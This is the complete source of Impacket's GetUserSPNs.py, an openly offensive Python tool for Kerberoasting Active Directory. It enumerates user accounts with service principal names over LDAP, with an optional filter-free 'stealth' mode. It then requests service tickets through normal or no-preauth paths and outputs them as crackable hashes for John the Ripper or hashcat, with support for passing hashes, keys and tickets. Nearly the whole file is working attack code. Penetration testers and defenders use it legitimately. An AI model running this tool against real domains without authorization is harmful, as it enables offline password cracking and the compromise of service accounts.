#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2023 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   This module will try to find Service Principal Names that are associated with normal user account.
#   Since normal account's password tend to be shorter than machine accounts, and knowing that a TGS request
#   will encrypt the ticket with the account the SPN is running under, this could be used for an offline
#   bruteforcing attack of the SPNs account NTLM hash if we can gather valid TGS for those SPNs.
#   This is part of the kerberoast attack researched by Tim Medin (@timmedin) and detailed at
#   https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf
#
#   Original idea of implementing this in Python belongs to @skelsec and his
#   https://github.com/skelsec/PyKerberoast project
#
#   This module provides a Python implementation for this attack, adding also the ability to PtH/Ticket/Key.
#   Also, disabled accounts won't be shown.
#
# Author:
#   Alberto Solino (@agsolino)
#
# ToDo:
#   [X] Add the capability for requesting TGS and output them in JtR/hashcat format
#

from __future__ import division
from __future__ import print_function
import argparse
import logging
import sys
from datetime import datetime
from binascii import hexlify, unhexlify

from pyasn1.codec.der import decoder
from impacket import version
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_TRUSTED_FOR_DELEGATION, \
    UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
from impacket.examples import logger
from impacket.examples.utils import parse_credentials
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP, AS_REP
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from impacket.ldap import ldap, ldapasn1
from impacket.smbconnection import SMBConnection, SessionError
from impacket.ntlm import compute_lmhash, compute_nthash


class GetUserSPNs:
    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        # Print header
        print(outputFormat.format(*header))
        print('  '.join(['-' * itemLen for itemLen in colLen]))

        # And now the rows
        for row in items:
            print(outputFormat.format(*row))

    def __init__(self, username, password, user_domain, target_domain, cmdLineOptions):
        self.__username = username
        self.__password = password
        self.__domain = user_domain
        self.__target = None
        self.__targetDomain = target_domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__no_preauth = cmdLineOptions.no_preauth
        self.__outputFileName = cmdLineOptions.outputfile
        self.__usersFile = cmdLineOptions.usersfile
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__requestTGS = cmdLineOptions.request
        # [!] in this script the value of -dc-ip option is self.__kdcIP and the value of -dc-host option is self.__kdcHost
        self.__kdcIP = cmdLineOptions.dc_ip
        self.__kdcHost = cmdLineOptions.dc_host
        self.__saveTGS = cmdLineOptions.save
        self.__requestUser = cmdLineOptions.request_user
        self.__stealth = cmdLineOptions.stealth
        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        # Create the baseDN
        domainParts = self.__targetDomain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        # Remove last ','
        self.baseDN = self.baseDN[:-1]
        # We can't set the KDC to a custom IP or Hostname when requesting things cross-domain
        # because then the KDC host will be used for both
        # the initial and the referral ticket, which breaks stuff.
        if user_domain != self.__targetDomain and (self.__kdcIP or self.__kdcHost):
            logging.warning('KDC IP address and hostname will be ignored because of cross-domain targeting.')
            self.__kdcIP = None
            self.__kdcHost = None

    def getMachineName(self, target):
        try:
            s = SMBConnection(target, target)
            s.login('', '')
        except OSError as e:
            if str(e).find('timed out') > 0:
                raise Exception('The connection is timed out. Probably 445/TCP port is closed. Try to specify '
                                'corresponding NetBIOS name or FQDN as the value of the -dc-host option')
            else:
                raise
        except SessionError as e:
            if str(e).find('STATUS_NOT_SUPPORTED') > 0:
                raise Exception('The SMB request is not supported. Probably NTLM is disabled. Try to specify '
                                'corresponding NetBIOS name or FQDN as the value of the -dc-host option')
            else:
                raise
        except Exception:
            if s.getServerName() == '':
                raise Exception('Error while anonymous logging into %s' % target)
        else:
            s.logoff()
        return "%s.%s" % (s.getServerName(), s.getServerDNSDomainName())

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def getTGT(self):
        domain, _, TGT, _ = CCache.parseFile(self.__domain)
        if TGT is not None:
            return TGT

        # No TGT in cache, request it
        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
        # cleartext password.
        # If no clear text password is provided, we just go with the defaults.
        if self.__password != '' and (self.__lmhash == '' and self.__nthash == ''):
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.__domain,
                                                                        compute_lmhash(self.__password),
                                                                        compute_nthash(self.__password), self.__aesKey,
                                                                        kdcHost=self.__kdcIP)
            except Exception as e:
                logging.debug('TGT: %s' % str(e))
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                        unhexlify(self.__lmhash),
                                                                        unhexlify(self.__nthash), self.__aesKey,
                                                                        kdcHost=self.__kdcIP)

        else:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                    unhexlify(self.__lmhash),
                                                                    unhexlify(self.__nthash), self.__aesKey,
                                                                    kdcHost=self.__kdcIP)
        TGT = {}
        TGT['KDC_REP'] = tgt
        TGT['cipher'] = cipher
        TGT['sessionKey'] = sessionKey

        return TGT

    def outputTGS(self, ticket, oldSessionKey, sessionKey, username, spn, fd=None):
        if self.__no_preauth:
            decodedTGS = decoder.decode(ticket, asn1Spec=AS_REP())[0]
        else:
            decodedTGS = decoder.decode(ticket, asn1Spec=TGS_REP())[0]
        # According to RFC4757 (RC4-HMAC) the cipher part is like:
        # struct EDATA {
        #       struct HEADER {
        #               OCTET Checksum[16];
        #               OCTET Confounder[8];
        #       } Header;
        #       OCTET Data[0];
        # } edata;
        #
        # In short, we're interested in splitting the checksum and the rest of the encrypted data
        #
        # Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)
        # last 12 bytes of the encrypted ticket represent the checksum of the decrypted 
        # ticket
        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'],
                spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
            if fd is None:
                print(entry)
            else:
                fd.write(entry + '\n')
        else:
            logging.error('Skipping %s/%s due to incompatible e-type %d' % (
                decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
                decodedTGS['ticket']['enc-part']['etype']))

        if self.__saveTGS is True:
            # Save the ticket
            logging.debug('About to save TGS for %s' % username)
            ccache = CCache()
            try:
                ccache.fromTGS(ticket, oldSessionKey, sessionKey)
                ccache.saveFile('%s.ccache' % username)
            except Exception as e:
                logging.error(str(e))

    def run(self):
        if self.__usersFile:
            self.request_users_file_TGSs()
            return

        if self.__kdcHost is not None and self.__targetDomain == self.__domain:
            self.__target = self.__kdcHost
        else:
            if self.__kdcIP is not None and self.__targetDomain == self.__domain:
                self.__target = self.__kdcIP
            else:
                self.__target = self.__targetDomain

            if self.__doKerberos:
                logging.info('Getting machine hostname')
                self.__target = self.getMachineName(self.__target)

        # Connect to LDAP
        try:
            ldapConnection = ldap.LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcIP)
            if self.__doKerberos is not True:
                ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                             self.__nthash,
                                             self.__aesKey, kdcHost=self.__kdcIP)
        except ldap.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                ldapConnection = ldap.LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcIP)
                if self.__doKerberos is not True:
                    ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
                else:
                    ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                                 self.__nthash,
                                                 self.__aesKey, kdcHost=self.__kdcIP)
            else:
                if str(e).find('NTLMAuthNegotiate') >= 0:
                    logging.critical("NTLM negotiation failed. Probably NTLM is disabled. Try to use Kerberos "
                                     "authentication instead.")
                else:
                    if self.__kdcIP is not None and self.__kdcHost is not None:
                        logging.critical("If the credentials are valid, check the hostname and IP address of KDC. They "
                                         "must match exactly each other")
                raise

        # Building the search filter
        filter_spn = "servicePrincipalName=*"
        filter_person = "objectCategory=person"
        filter_not_disabled = "!(userAccountControl:1.2.840.113556.1.4.803:=2)"

        searchFilter = "(&"
        searchFilter += "(" + filter_person + ")"
        searchFilter += "(" + filter_not_disabled + ")"

        if self.__stealth is True:
            logging.warning('Stealth option may cause huge memory consumption / out-of-memory errors on very large domains.')
        else:
            searchFilter += "(" + filter_spn + ")"

        if self.__requestUser is not None:
            searchFilter += '(sAMAccountName:=%s)' % self.__requestUser

        searchFilter += ')'

        try:
            # Microsoft Active Directory set an hard limit of 1000 entries returned by any search
            paged_search_control = ldapasn1.SimplePagedResultsControl(criticality=True, size=1000)

            resp = ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['servicePrincipalName', 'sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                         searchControls=[paged_search_control])

        except ldap.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                # We should never reach this code as we use paged search now
                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
                resp = e.getAnswers()
                pass
            else:
                raise

        answers = []
        logging.debug('Total of records returned %d' % len(resp))
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName = ''
            memberOf = ''
            SPNs = []
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            delegation = ''
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = str(attribute['vals'][0])
                        if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
                            delegation = 'unconstrained'
                        elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                            delegation = 'constrained'
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'servicePrincipalName':
                        for spn in attribute['vals']:
                            SPNs.append(str(spn))

                if mustCommit is True:
                    if int(userAccountControl) & UF_ACCOUNTDISABLE:
                        logging.debug('Bypassing disabled account %s ' % sAMAccountName)
                    else:
                        for spn in SPNs:
                            answers.append([spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation])
            except Exception as e:
                logging.error('Skipping item, cannot process due to error %s' % str(e))
                pass

        if len(answers) > 0:
            self.printTable(answers, header=["ServicePrincipalName", "Name", "MemberOf", "PasswordLastSet", "LastLogon",
                                             "Delegation"])
            print('\n\n')

            if self.__requestTGS is True or self.__requestUser is not None:
                # Let's get unique user names and a SPN to request a TGS for
                users = dict((vals[1], vals[0]) for vals in answers)

                # Get a TGT for the current user
                TGT = self.getTGT()

                if self.__outputFileName is not None:
                    fd = open(self.__outputFileName, 'w+')
                else:
                    fd = None

                for user, SPN in users.items():
                    sAMAccountName = user
                    downLevelLogonName = self.__targetDomain + "\\" + sAMAccountName

                    try:
                        principalName = Principal()
                        principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                        principalName.components = [downLevelLogonName]

                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                                self.__kdcIP,
                                                                                TGT['KDC_REP'], TGT['cipher'],
                                                                                TGT['sessionKey'])
                        self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName,
                                       self.__targetDomain + "/" + sAMAccountName, fd)
                    except Exception as e:
                        logging.debug("Exception:", exc_info=True)
                        logging.error('Principal: %s - %s' % (downLevelLogonName, str(e)))

                if fd is not None:
                    fd.close()

        else:
            print("No entries found!")

    def request_users_file_TGSs(self):

        with open(self.__usersFile) as fi:
            usernames = [line.strip() for line in fi]

        self.request_multiple_TGSs(usernames)

    def request_multiple_TGSs(self, usernames):
        if self.__outputFileName is not None:
            fd = open(self.__outputFileName, 'w+')
        else:
            fd = None
            
        if self.__no_preauth:
            for username in usernames:
                try:
                    no_preauth_pincipal = Principal(self.__no_preauth, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName=no_preauth_pincipal,
                                                                            password=self.__password,
                                                                            domain=self.__domain,
                                                                            lmhash=(self.__lmhash),
                                                                            nthash=(self.__nthash),
                                                                            aesKey=self.__aesKey,
                                                                            kdcHost=self.__kdcHost,
                                                                            serverName=username,
                                                                            kerberoast_no_preauth=True)
                    self.outputTGS(tgt, oldSessionKey, sessionKey, username, username, fd)
                except Exception as e:
                    logging.debug("Exception:", exc_info=True)
                    logging.error('Principal: %s - %s' % (username, str(e)))

            if fd is not None:
                fd.close()
        else:
            # Get a TGT for the current user
            TGT = self.getTGT()
            
            for username in usernames:
                try:
                    principalName = Principal()
                    principalName.type = constants.PrincipalNameType.NT_ENTERPRISE.value
                    principalName.components = [username]

                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                            self.__kdcIP,
                                                                            TGT['KDC_REP'], TGT['cipher'],
                                                                            TGT['sessionKey'])
                    self.outputTGS(tgs, oldSessionKey, sessionKey, username, username, fd)
                except Exception as e:
                    logging.debug("Exception:", exc_info=True)
                    logging.error('Principal: %s - %s' % (username, str(e)))

            if fd is not None:
                fd.close()


# Process command-line arguments.
if __name__ == '__main__':
    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description="Queries target domain for SPNs that are running "
                                                                "under a user account")

    parser.add_argument('target', action='store', help='domain[/username[:password]]')
    parser.add_argument('-target-domain', action='store',
                        help='Domain to query/request if different than the domain of the user. '
                             'Allows for Kerberoasting across trusts.')
    parser.add_argument('-no-preauth', action='store', help='account that does not require preauth, to obtain Service Ticket'
                                                         ' through the AS')
    parser.add_argument('-stealth', action='store_true', help='Removes the (servicePrincipalName=*) filter from the LDAP query for added stealth. '
                                                              'May cause huge memory consumption / errors on large domains.')
    parser.add_argument('-usersfile', help='File with user per line to test')
    parser.add_argument('-request', action='store_true', default=False, help='Requests TGS for users and output them '
                                                                             'in JtR/hashcat format (default False)')
    parser.add_argument('-request-user', action='store', metavar='username', help='Requests TGS for the SPN associated '
                                                                                  'to the user specified (just the username, no domain needed)')
    parser.add_argument('-save', action='store_true', default=False, help='Saves TGS requested to disk. Format is '
                                                                          '<username>.ccache. Auto selects -request')
    parser.add_argument('-outputfile', action='store',
                        help='Output filename to write ciphers in JtR/hashcat format. Auto selects -request')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output.')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials '
                            'cannot be found, it will use the ones specified in the command '
                            'line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')

    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store', metavar='ip address', help='IP Address of the domain controller. If '
                                                                            'ommited it use the domain part (FQDN) '
                                                                            'specified in the target parameter. Ignored'
                                                                            'if -target-domain is specified.')
    group.add_argument('-dc-host', action='store', metavar='hostname', help='Hostname of the domain controller to use. '
                                                                            'If ommited, the domain part (FQDN) '
                                                                            'specified in the account parameter will be used')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.no_preauth and options.usersfile is None:
        logging.error('You have to specify -usersfile when -no-preauth is supplied. Usersfile must contain'
                      ' a list of SPNs and/or sAMAccountNames to Kerberoast.')
        sys.exit(1)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    userDomain, username, password = parse_credentials(options.target)

    if userDomain == '':
        logging.critical('userDomain should be specified!')
        sys.exit(1)

    if options.target_domain:
        targetDomain = options.target_domain
    else:
        targetDomain = userDomain

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass

        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.save is True or options.outputfile is not None:
        options.request = True

    try:
        executer = GetUserSPNs(username, password, userDomain, targetDomain, options)
        executer.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))
